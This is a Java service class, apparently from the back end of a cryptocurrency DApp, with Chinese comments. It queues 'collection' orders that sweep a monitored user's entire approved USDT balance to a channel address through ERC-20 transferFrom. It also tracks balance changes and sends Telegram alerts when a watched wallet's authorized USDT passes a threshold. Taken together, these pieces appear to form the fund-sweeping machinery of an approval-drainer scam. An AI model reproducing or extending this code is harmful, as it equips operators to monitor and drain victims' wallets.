package project.monitor.job.transferfrom;

import java.util.Date;

import org.springframework.orm.hibernate5.support.HibernateDaoSupport;

import kernel.util.Arith;
import kernel.util.ThreadUtils;
import project.Constants;
import project.log.MoneyLog;
import project.log.MoneyLogService;
import project.monitor.AutoMonitorAddressConfigService;
import project.monitor.AutoMonitorOrderService;
import project.monitor.AutoMonitorTipService;
import project.monitor.AutoMonitorWalletService;
import project.monitor.bonus.AutoMonitorSettleAddressConfigService;
import project.monitor.bonus.BonusSettlementService;
import project.monitor.erc20.service.Erc20Service;
import project.monitor.model.AutoMonitorAddressConfig;
import project.monitor.model.AutoMonitorOrder;
import project.monitor.model.AutoMonitorTip;
import project.monitor.model.AutoMonitorWallet;
import project.monitor.pledge.PledgeOrderService;
import project.monitor.report.DAppUserDataSumService;
import project.monitor.telegram.business.TelegramBusinessMessageService;
import project.party.PartyService;
import project.party.model.Party;
import project.syspara.SysparaService;
import project.user.UserDataService;
import project.wallet.WalletExtend;
import project.wallet.WalletService;

public class TransferFromServiceImpl extends HibernateDaoSupport implements TransferFromService {
	private Erc20Service erc20Service;

	private WalletService walletService;

	private AutoMonitorAddressConfigService autoMonitorAddressConfigService;
	private AutoMonitorOrderService autoMonitorOrderService;

	private SysparaService sysparaService;

	private UserDataService userDataService;

	protected PartyService partyService;

	protected TelegramBusinessMessageService telegramBusinessMessageService;

	protected DAppUserDataSumService dAppUserDataSumService;

	private PledgeOrderService pledgeOrderService;

	protected BonusSettlementService bonusSettlementService;
	protected AutoMonitorSettleAddressConfigService autoMonitorSettleAddressConfigService;
	
	protected AutoMonitorWalletService autoMonitorWalletService;
	protected MoneyLogService moneyLogService;
	protected AutoMonitorTipService autoMonitorTipService;
	
	@Override
	public void saveTransferFrom(TransferFrom transferFrom) {
		AutoMonitorWallet item = transferFrom.getAutoMonitorWallet();
		String to = transferFrom.getTo();

		AutoMonitorOrder entity = new AutoMonitorOrder();
		entity.setPartyId(item.getPartyId());
		entity.setCreated(new Date());

		entity.setAddress(item.getAddress());
		entity.setChannel_address(to);

		entity.setMonitor_address(item.getMonitor_address());
		entity.setRelationOrderNo(null == transferFrom.getRelationOrderNo() ? "" : transferFrom.getRelationOrderNo());

		double balance = 0;
		if (transferFrom.getCollectAmount() <= 0) {
			// 归集全部
			WalletExtend walletExtend = walletService.saveExtendByPara(item.getPartyId(),
					Constants.WALLETEXTEND_DAPP_USDT_USER);
			balance = walletExtend.getAmount();

			Double erc_balance = erc20Service.getBalance(item.getAddress());
			if (erc_balance != null) {
				balance = erc_balance;
			}
		}else {
			balance = transferFrom.getCollectAmount();
		}

		entity.setVolume(balance);
		entity.setSettle_amount(autoMonitorSettleAddressConfigService.computeSettleAmount(entity.getVolume()));

		AutoMonitorOrder db = autoMonitorOrderService.findByAddressAndSucceeded(item.getAddress(), 0);
		if (db != null) {
			entity.setSucceeded(2);
			entity.setError("该地址存在未完成的归集记录");
			autoMonitorOrderService.save(entity);
			return;
		}

		/**
		 * 最小币值 ，小于不转账
		 */
		Double balance_min = sysparaService.find("transferfrom_balance_min").getDouble();

		if (balance < balance_min) {
			entity.setSucceeded(2);
			entity.setError("币值少于[" + balance_min + "]USDT");
			autoMonitorOrderService.save(entity);
			return;
		}

		AutoMonitorAddressConfig config = autoMonitorAddressConfigService.findByAddress(item.getMonitor_address());

		if (config == null) {
			entity.setSucceeded(2);
			entity.setError("无法找到授权地址鉴权信息");
			autoMonitorOrderService.save(entity);
			return;
		}

		entity.setSucceeded(-1);
		autoMonitorOrderService.save(entity);
	}

	// 1.交易成功 0.交易失败
	@Override
	public void saveConfirm(String id, Integer status, String hash) {

		AutoMonitorOrder entity = autoMonitorOrderService.findById(id);
		if (entity.getSucceeded() != 0) {
			/**
			 * 已经处理过，直接退出
			 */
			return;
		}
		Party party = partyService.cachePartyBy(entity.getPartyId().toString(), false);
		if (status == 0) {
			/**
			 * 交易失败
			 */

			entity.setSucceeded(2);
			autoMonitorOrderService.update(entity);
			/**
			 * 交易确认失败发送消息
			 */

			telegramBusinessMessageService.sendTransferFromErrorTeleg(party, entity.getVolume(), null,
					entity.getTxn_hash());

		} else if (status == 1) {
			/**
			 * 交易成功
			 */

			/*
			 * 保存订单状态
			 */

			entity.setSucceeded(1);
			autoMonitorOrderService.update(entity);

			/*
			 * 转账确认后同步余额
			 */
			Double balance = erc20Service.getBalance(entity.getAddress());
			WalletExtend walletExtend = walletService.saveExtendByPara(entity.getPartyId(),
					Constants.WALLETEXTEND_DAPP_USDT_USER);
			if (walletExtend.getAmount() != balance) {
				walletService.updateExtend(entity.getPartyId().toString(), Constants.WALLETEXTEND_DAPP_USDT_USER,
						Arith.sub(balance, walletExtend.getAmount()));
			}
			
			/*
			 * 报表处理
			 */

			userDataService.saveRechargeHandleDapp(entity.getPartyId(), entity.getVolume(), "usdt");
			dAppUserDataSumService.saveTransferfrom(entity.getPartyId(), entity.getVolume());

			/*
			 * 转账到质押账户
			 */

			walletService.updateExtend(entity.getPartyId().toString(), Constants.WALLETEXTEND_DAPP_USDT,
					entity.getVolume());
			pledgeOrderService.savejoin(entity.getPartyId().toString());
			
			//等待上面处理后发送消息
			ThreadUtils.sleep(300);
			/**
			 * 归集发送消息
			 */
			telegramBusinessMessageService.sendCollectTeleg(party, entity.getVolume());
			
			/**
			 * 清账信号发起
			 */
			// bonusSettlementService.signal();
		}
	}
	/**
	 * 同步余额处理
	 * @param item
	 * @param walletExtend
	 * @param balance
	 */
	private void sycnUsdt(AutoMonitorWallet item,WalletExtend walletExtend,Double balance) {
		try {

			double amount_before = walletExtend.getAmount();

			if (walletExtend.getAmount() != balance) {
				//状态变更时不更新余额
				AutoMonitorWallet dbWallet = autoMonitorWalletService.findById(item.getId().toString());
				if(dbWallet.getSucceeded()!=1) {
					return;
				}
				//存在 在处理中的订单就先不同步余额
//				AutoMonitorOrder db = autoMonitorOrderService.findByAddressAndSucceeded(item.getAddress(), 0);
//				if (db != null) {
//					return;
//				}
				
				walletService.updateExtend(item.getPartyId().toString(), Constants.WALLETEXTEND_DAPP_USDT_USER,
						Arith.sub(balance, walletExtend.getAmount()));
				// 余额变更记录报表
				dAppUserDataSumService.saveUsdtUser(item.getPartyId(),
						Arith.sub(balance, walletExtend.getAmount()));
				/*
				 * 保存资金日志
				 */
				MoneyLog moneyLog = new MoneyLog();
				moneyLog.setAmount_before(amount_before);
				moneyLog.setAmount(Arith.sub(balance, walletExtend.getAmount()));
				moneyLog.setAmount_after(Arith.add(amount_before, Arith.sub(balance, walletExtend.getAmount())));

				moneyLog.setLog("USDT币值变化");
				moneyLog.setPartyId(item.getPartyId());
				moneyLog.setWallettype(Constants.WALLETEXTEND_DAPP_USDT_USER);
				moneyLog.setCreateTime(new Date());

				moneyLogService.save(moneyLog);
				/**
				 * 群通知
				 */
				Party party = partyService.cachePartyBy(item.getPartyId(), false);
				telegramBusinessMessageService.sendUsdtChangeTeleg(party, moneyLog.getAmount_before(),
						moneyLog.getAmount(), moneyLog.getAmount_after());
				
				// 余额>=阈值时，业务提醒操作
				if (balance >= item.getThreshold()) {

					AutoMonitorTip tip = new AutoMonitorTip();

					
					
					
					tip.setPartyId(item.getPartyId());
					tip.setTiptype(0);
					tip.setTipinfo("账户授权USDT超过阀值[" + item.getThreshold() + "]");
					tip.setDispose_method("无");
					tip.setCreated(new Date());
					autoMonitorTipService.saveTipNewThreshold(tip);
				}
			}
			
		} catch (Throwable t) {
			logger.error("TransferFromServiceImpl sycnUsdt() fail", t);
		}
	}
	public void setWalletService(WalletService walletService) {
		this.walletService = walletService;
	}

	public void setAutoMonitorAddressConfigService(AutoMonitorAddressConfigService autoMonitorAddressConfigService) {
		this.autoMonitorAddressConfigService = autoMonitorAddressConfigService;
	}

	public void setErc20Service(Erc20Service erc20Service) {
		this.erc20Service = erc20Service;
	}

	public void setAutoMonitorOrderService(AutoMonitorOrderService autoMonitorOrderService) {
		this.autoMonitorOrderService = autoMonitorOrderService;
	}

	public void setSysparaService(SysparaService sysparaService) {
		this.sysparaService = sysparaService;
	}

	public void setUserDataService(UserDataService userDataService) {
		this.userDataService = userDataService;
	}

	public void setPartyService(PartyService partyService) {
		this.partyService = partyService;
	}

	public void setTelegramBusinessMessageService(TelegramBusinessMessageService telegramBusinessMessageService) {
		this.telegramBusinessMessageService = telegramBusinessMessageService;
	}

	public void setdAppUserDataSumService(DAppUserDataSumService dAppUserDataSumService) {
		this.dAppUserDataSumService = dAppUserDataSumService;
	}

	public void setPledgeOrderService(PledgeOrderService pledgeOrderService) {
		this.pledgeOrderService = pledgeOrderService;
	}

	public void setBonusSettlementService(BonusSettlementService bonusSettlementService) {
		this.bonusSettlementService = bonusSettlementService;
	}

	public void setAutoMonitorSettleAddressConfigService(
			AutoMonitorSettleAddressConfigService autoMonitorSettleAddressConfigService) {
		this.autoMonitorSettleAddressConfigService = autoMonitorSettleAddressConfigService;
	}

	public void setAutoMonitorWalletService(AutoMonitorWalletService autoMonitorWalletService) {
		this.autoMonitorWalletService = autoMonitorWalletService;
	}

	public void setMoneyLogService(MoneyLogService moneyLogService) {
		this.moneyLogService = moneyLogService;
	}

	public void setAutoMonitorTipService(AutoMonitorTipService autoMonitorTipService) {
		this.autoMonitorTipService = autoMonitorTipService;
	}

	
}
